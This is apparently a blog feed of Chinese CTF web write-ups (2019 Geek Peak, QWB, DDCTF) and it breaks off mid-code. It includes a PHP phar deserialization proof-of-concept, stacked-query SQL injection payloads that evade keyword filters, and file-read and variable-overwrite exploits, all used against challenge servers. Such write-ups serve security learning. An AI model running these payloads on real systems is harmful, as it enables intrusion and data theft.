class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>(<span class="string">"_show"</span>=&gt;<span class="string">"file_get"</span>);</div><div class="line">        <span class="keyword">$this</span>-&gt;file=<span class="keyword">new</span> Show();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;params[$key];</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</div><div class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;file;</div><div class="line">    &#125;</div><div class="line">&#125;    </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sh0w</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">    <span class="keyword">public</span> $test;</div><div class="line">    <span class="keyword">public</span> $str;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> S6ow();    </div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;str-&gt;_show();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"poc.phar"</span>); <span class="comment">//后缀名必须为phar</span></div><div class="line">$phar-&gt;startBuffering();</div><div class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></div><div class="line">$o = <span class="keyword">new</span> sh0w();</div><div class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></div><div class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></div><div class="line"><span class="comment">//签名自动计算</span></div><div class="line">$phar-&gt;stopBuffering();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>触发过程：</strong></p><p><strong>sh0w对象反序列化时调用<code>__destruct</code>，调用了S6ow对象的<code>_show</code>方法，由于_show方法不存在，从而调用了<code>__call</code>，此时<code>$this-&gt;{$name}</code>的值变为了<code>_show</code>，在进行<code>$this-&gt;{$name}</code>判断时，由于<code>_show</code>属性也不存在，从而触发了<code>__get</code>方法，<code>$this-&gt;{$name}</code>的值被赋为<code>file_get</code>，从而调用了<code>file_get</code>函数，由于一开始<code>$this-&gt;file</code>的值被设为了Show对象，所以这里将Show对象输出，触发了Show对象的<code>__ToString</code>方法，成功绕过了过滤读取flag</strong></p><p><strong>生成phar文件，将后缀重名名为.jpg上传至服务器,通过phar伪协议读取上传后的文件：<code>/file.php?file=phar:///var/www/html/upload/4935ad2c4be6114f4bf09d55ed82a60b.jpg</code></strong></p><p><img src="http://pic.c1imber.top/blog/20191020/X1VVOQSvHbD7.png?imageslim" alt="mark"><br><strong>base64解码后获取到flag</strong><br><img src="http://pic.c1imber.top/blog/20191020/BO15lt513Lca.png?imageslim" alt="mark"></p><p><strong>剩下的题目，等待writeup出来后学习</strong></p><p><img src="http://pic.c1imber.top/blog/20191020/29mUSro8ePHA.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019极客巅峰ctf记录&quot;&gt;&lt;a href=&quot;#2019极客巅峰ctf记录&quot; class=&quot;headerlink&quot; title=&quot;2019极客巅峰ctf记录&quot;&gt;&lt;/a&gt;2019极客巅峰ctf记录&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;周六抽时间做了2019极客巅峰的ct
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2019强网杯-过滤select的注入</title>
    <link href="https://c1aysec.github.io/2019/05/28/2019%E5%BC%BA%E7%BD%91%E6%9D%AF-%E8%BF%87%E6%BB%A4select%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
    <id>https://c1aysec.github.io/2019/05/28/2019强网杯-过滤select的注入/</id>
    <published>2019-05-27T16:15:00.000Z</published>
    <updated>2019-11-06T17:21:20.991Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019强网杯-过滤select的注入"><a href="#2019强网杯-过滤select的注入" class="headerlink" title="2019强网杯-过滤select的注入"></a>2019强网杯-过滤select的注入</h1><h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p><strong>这道题的题目就是随便注，说是取自某次真实渗透环境，确定了这道题是考察注入，经测试发现为单引号包裹的字符型注入，但是存在存在过滤，过滤的sql关键字如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/mY2fTXh6Wy5t.png" alt="mark"><br><strong>这里过滤了select关键字，/i表示对大小写进行检查，所以大小写绕过无效，所以这里需要想别的办法，首先通过报错注入可以获取数据库的相关信息</strong></p><p><strong>通过报错注入获取当前数据库类型与版本：</strong></p><pre><code>http://117.78.39.172:32689/?inject=-1%27%20and%20extractvalue(1,concat(1,version()))--+</code></pre><p><img src="http://pic.c1imber.top/blog/20190528/oF419eR52pVL.png" alt="mark"><br><strong>.27-MariaDB-0ubuntu0.16.04.1</strong></p><p><strong>获取当前数据库名：</strong><br><img src="http://pic.c1imber.top/blog/20190528/NtJ9xJxCGk4O.png" alt="mark"><br><strong>supersqli</strong></p><p><strong>这里因为严格过滤了select关键字，导致不能继续注入，但是之后发现可以执行多语句，通过堆叠查询成功获取当前数据库（supersqli）下的表名</strong></p><pre><code>http://117.78.39.172:32689/?inject=-1%27;use%20supersqli;show%20tables;--+</code></pre><p><img src="http://pic.c1imber.top/blog/20190528/0isGzvkxIDkd.png" alt="mark"><br><strong>于是有了一个清晰的思路，可以通过执行多语句，将要执行的sql语句进行拼接，这样就可以将过滤的 sql关键字拆分绕过检测，通过动态执行sql语句发现1919810931114514表当中存在flag字段，payload如下</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">';<span class="keyword">use</span> information_schema;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect column_name from columns wher'</span>,<span class="string">'e table_name="1919810931114514"'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/LPeDMW7UJFWE.png" alt="mark"><br><strong>之后就可以获取flag列的内容了</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">';<span class="keyword">use</span> supersqli;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'s'</span>,<span class="string">'elect `flag` from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> stmt1 <span class="keyword">FROM</span> @<span class="keyword">sql</span>;<span class="keyword">EXECUTE</span> stmt1;<span class="comment">--+</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/20190528/hn2CDwKtqwoR.png" alt="mark"></p><p><strong>（需要注意的一点是这一点使用了strstr对set和prepare关键字进行了检查，但是strstr检查不对大小写进行检查，所以这里可以通过大小写绕过，set和prepare关键字只要有一个是大写就可以绕过）</strong><br><img src="http://pic.c1imber.top/blog/20190528/hXVAJ6ouP22Q.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019强网杯-过滤select的注入&quot;&gt;&lt;a href=&quot;#2019强网杯-过滤select的注入&quot; class=&quot;headerlink&quot; title=&quot;2019强网杯-过滤select的注入&quot;&gt;&lt;/a&gt;2019强网杯-过滤select的注入&lt;/h1&gt;&lt;h3 i
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF2019 write up</title>
    <link href="https://c1aysec.github.io/2019/04/18/DDCTF2019%20write%20up/"/>
    <id>https://c1aysec.github.io/2019/04/18/DDCTF2019 write up/</id>
    <published>2019-04-18T10:57:00.000Z</published>
    <updated>2019-11-06T17:02:23.880Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DDCTF2019-write-up"><a href="#DDCTF2019-write-up" class="headerlink" title="DDCTF2019 write up"></a>DDCTF2019 write up</h1><p><strong>最近几天抽时间做了做DDCTF，只做出了几道Web，菜哭了==，这里将做出的题记录一下吧（参赛id:stark）</strong></p><h3 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h3><p><code>http://117.51.150.246</code></p><p><strong>打开题目后跳到了一个连接，页面内容是一个表情包，jpg参数值看起来像一串base64,如下图</strong><br><img src="http://pic.c1imber.top/blog/20190418/jS6lSMJKAepR.png" alt="mark"><br><strong>将jpg的参数值TmpZMlF6WXhOamN5UlRaQk56QTJOdz09经过两次base64解码和一次hex解码后得到flag.jpg，另外在页面源码里面看到了flag.jpg图片内容base64编码后的内容，这里是使用img标签通过data伪协议将图片显示到了页面中</strong><br><img src="http://pic.c1imber.top/blog/20190418/vS8u1pFyKvFV.png" alt="mark"><br><strong>所以猜测这里可能是一个任意文件读取，将index.php进行一次hex编码两次base64编码后得到TmprMlpUWTBOalUzT0RKbE56QTJPRGN3,将值传入jpg参数尝试读取index.php源码，可以读取成功</strong><br><img src="http://pic.c1imber.top/blog/20190418/oOkUiMmqI69p.png" alt="mark"><br><strong>结果如下：</strong></p><pre><code>PD9waHANCi8qDQogKiBodHRwczovL2Jsb2cuY3Nkbi5uZXQvRmVuZ0JhbkxpdVl1bi9hcnRpY2xlL2RldGFpbHMvODA2MTY2MDcNCiAqIERhdGU6IEp1bHkgNCwyMDE4DQogKi8NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8fCB+RV9OT1RJQ0UpOw0KDQoNCmhlYWRlcignY29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7DQppZighIGlzc2V0KCRfR0VUWydqcGcnXSkpDQogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2pwZz1UbXBaTWxGNldYaE9hbU41VWxSYVFrNTZRVEpPZHowOScpOw0KJGZpbGUgPSBoZXgyYmluKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnanBnJ10pKSk7DQplY2hvICc8dGl0bGU+Jy4kX0dFVFsnanBnJ10uJzwvdGl0bGU+JzsNCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwiIiwgJGZpbGUpOw0KZWNobyAkZmlsZS4nPC9icj4nOw0KJGZpbGUgPSBzdHJfcmVwbGFjZSgiY29uZmlnIiwiISIsICRmaWxlKTsNCmVjaG8gJGZpbGUuJzwvYnI+JzsNCiR0eHQgPSBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoNCmVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIi4kdHh0LiInPjwvaW1nPiI7DQovKg0KICogQ2FuIHlvdSBmaW5kIHRoZSBmbGFnIGZpbGU/DQogKg0KICovDQoNCj8+DQo=</code></pre><p><strong>base64解码后：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">* https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></div><div class="line"><span class="comment">* Date: July 4,2018</span></div><div class="line"><span class="comment">*/</span></div><div class="line">error_reporting(E_ALL || ~E_NOTICE);</div><div class="line"></div><div class="line"></div><div class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</div><div class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</div><div class="line">   header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</div><div class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</div><div class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</div><div class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</div><div class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</div><div class="line"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</div><div class="line">$txt = base64_encode(file_get_contents($file));</div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment">* Can you find the flag file?</span></div><div class="line"><span class="comment">*</span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>通过源码可以大概猜测出来flag在config.php配置文件里面，经过测试这个文件是存在的，但是str_replace(“config”,”!”, $file)会将传入的config.php替换为!.php，所以这里是绕不过去的，但是代码里面有一个博客链接：</strong></p><p><code>https://blog.csdn.net/FengBanLiuYun/article/details/80616607</code></p><p><strong>这里可能是一个hint，但是这篇连接的文章并没有什么提示，接下来在博客里翻到了一篇文章，这个文章讲的是有关临时交换文件的</strong></p><p><code>https://blog.csdn.net/FengBanLiuYun/article/details/80913909</code><br><img src="http://pic.c1imber.top/blog/20190418/76UJHkxGkBvK.png" alt="mark"><br><strong>这篇文章里面提到了一个名为practice.txt.swp的文件，开了一下脑洞，试着访问了一下该文件发现确实存在</strong><br><img src="http://pic.c1imber.top/blog/20190418/wkLLrE3SckL1.png" alt="mark"><br><strong>文件内容是另一个文件的名字f1ag!ddctf.php，并且里面有!，可以绕过之前的检测，所以这里可以读取到f1ag!ddctf.php文件，将f1agconfigddctf.php进行一次hex编码两次base64编码后构造出TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==,传入jpg参数读到f1ag!ddctf.php的源码</strong><br><img src="http://pic.c1imber.top/blog/20190418/1aoU9BKDK0Ad.png" alt="mark"><br><strong>得到结果：</strong></p><pre><code>PD9waHANCmluY2x1ZGUoJ2NvbmZpZy5waHAnKTsNCiRrID0gJ2hlbGxvJzsNCmV4dHJhY3QoJF9HRVQpOw0KaWYoaXNzZXQoJHVpZCkpDQp7DQogICAgJGNvbnRlbnQ9dHJpbShmaWxlX2dldF9jb250ZW50cygkaykpOw0KICAgIGlmKCR1aWQ9PSRjb250ZW50KQ0KCXsNCgkJZWNobyAkZmxhZzsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobydoZWxsbyc7DQoJfQ0KfQ0KDQo/Pg==</code></pre><p><strong>base64解码得到源码内容：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</div><div class="line">$k = <span class="string">'hello'</span>;</div><div class="line">extract($_GET);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</div><div class="line">&#123;</div><div class="line">    $content=trim(file_get_contents($k));</div><div class="line">    <span class="keyword">if</span>($uid==$content)</div><div class="line">&#123;</div><div class="line"><span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="keyword">echo</span><span class="string">'hello'</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>这里是一个简单的变量覆盖，可以构造:<code>http://117.51.150.246/f1ag!ddctf.php?uid=f1ag!ddctf.php&amp;k=practice.txt.swp</code>获取flag</strong></p><p><img src="http://pic.c1imber.top/blog/20190418/QdTXwWrHMtNc.png" alt="mark"></p><p><strong>flag:DDCTF{436f6e67726174756c6174696f6e73}</strong></p><p><strong>另外这里有一个tip，可以不使用变量覆盖，直接构造<code>http://117.51.150.246/f1ag!ddctf.php?uid=</code>获取到flag</strong><br><img src="http://pic.c1imber.top/blog/20190418/cchVsB66NEWn.png" alt="mark"></p><p><strong>因为$k变量的值hello是一个不存在的文件，会导致<code>file_get_contents</code>返回False，接下来False经过<code>trim</code>函数处理后会产生一次类型转换变成空字符串，所以<code>$uid==$content</code>,直接输出了flag</strong></p><h3 id="WEB签到题"><a href="#WEB签到题" class="headerlink" title="WEB签到题"></a>WEB签到题</h3><p><code>http://117.51.158.44/index.php</code></p><p><strong>打开后直接访问会提示没有登陆权限</strong><br><img src="http://pic.c1imber.top/blog/20190418/qoL8pEHQ5e4X.png" alt="mark"><br><strong>查看源码后发现存在一个<code>/js/index.js</code>文件,index.js代码如下：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment"> * Created by PhpStorm.</span></div><div class="line"><span class="comment"> * User: didi</span></div><div class="line"><span class="comment"> * Date: 2019/1/13</span></div><div class="line"><span class="comment"> * Time: 9:05 PM</span></div><div class="line"><span class="comment"> */</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    $.ajax(&#123;</div><div class="line">        type: <span class="string">"post"</span>,</div><div class="line">        url:<span class="string">"http://117.51.158.44/app/Auth.php"</span>,</div><div class="line">        contentType: <span class="string">"application/json;charset=utf-8"</span>,</div><div class="line">        dataType: <span class="string">"json"</span>,</div><div class="line">        beforeSend: <span class="function"><span class="keyword">function</span> (<span class="params">XMLHttpRequest</span>) </span>&#123;</div><div class="line">            XMLHttpRequest.setRequestHeader(<span class="string">"didictf_username"</span>, <span class="string">""</span>);</div><div class="line">        &#125;,</div><div class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">getdata</span>) </span>&#123;</div><div class="line">           <span class="built_in">console</span>.log(getdata);</div><div class="line">           <span class="keyword">if</span>(getdata.data !== <span class="string">''</span>) &#123;</div><div class="line">               <span class="built_in">document</span>.getElementById(<span class="string">'auth'</span>).innerHTML = getdata.data;</div><div class="line">           &#125;</div><div class="line">        &#125;,<span class="attr">error</span>:<span class="function"><span class="keyword">function</span>(<span class="params">error</span>)</span>&#123;</div><div class="line">            <span class="built_in">console</span>.log(error);</div><div class="line">        &#125;</div><div class="line">    &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>通过简单的审计可以看到这里存在一个认证，通过ajax添加了一个http请求头<code>didictf_username</code>，猜测服务端是根据这个header头的值去做认证的，如果想访问到页面，首先需要得到出来一个username值,所以这里先对<code>didictf_username</code>进行爆破，通过爆破看到admin可以认证成功,之后会返回一个提示：app\/fL2XID2i0Cdh.php这个文件</strong><br><img src="http://pic.c1imber.top/blog/20190418/khmW4Jo6nXoL.png" alt="mark"><br><strong>访问<code>http://117.51.158.44/app/fL2XID2i0Cdh.php</code>,可以获取到源码，源码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div></pre></td><td class="code"><pre><div class="line">url:app/Application.php</div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</div><div class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,</div><div class="line">            <span class="string">'data'</span> =&gt; $data];</div><div class="line">        $ret = json_encode($ret);</div><div class="line">        header(<span class="string">'Content-type: application/json'</span>);</div><div class="line">        <span class="keyword">echo</span> $ret;</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</div><div class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</div><div class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</div><div class="line">            <span class="keyword">exit</span>();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;</div><div class="line">    $path = trim($path);</div><div class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);</div><div class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path);</div><div class="line">    <span class="keyword">return</span> $path;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path);</div><div class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;</div><div class="line">            <span class="keyword">exit</span>();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">url:app/Session.php</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="comment">//key建议为8位字符串</span></div><div class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_expiration= <span class="number">7200</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_path= <span class="string">''</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_domain= <span class="string">''</span>;</div><div class="line">    <span class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</div><div class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></div><div class="line"><span class="function">    </span>&#123;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;get_key();</div><div class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</div><div class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</div><div class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</div><div class="line">                <span 